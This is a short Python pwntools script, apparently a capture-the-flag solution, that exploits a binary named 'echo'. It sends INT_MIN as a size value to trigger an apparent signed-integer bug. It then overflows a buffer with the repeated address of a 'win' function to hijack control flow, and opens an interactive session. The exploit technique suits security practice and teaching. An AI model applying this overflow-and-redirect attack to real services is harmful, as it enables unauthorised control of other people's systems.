#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './echo'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.GDB:
        return gdb.debug(BIN_FILE)

    return process(BIN_FILE)

def attack(io):
    io.sendlineafter('Size: ', '-2147483648')
    io.sendlineafter('Data: ', p64(binf.sym['win']) * (0x120 // 8))

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
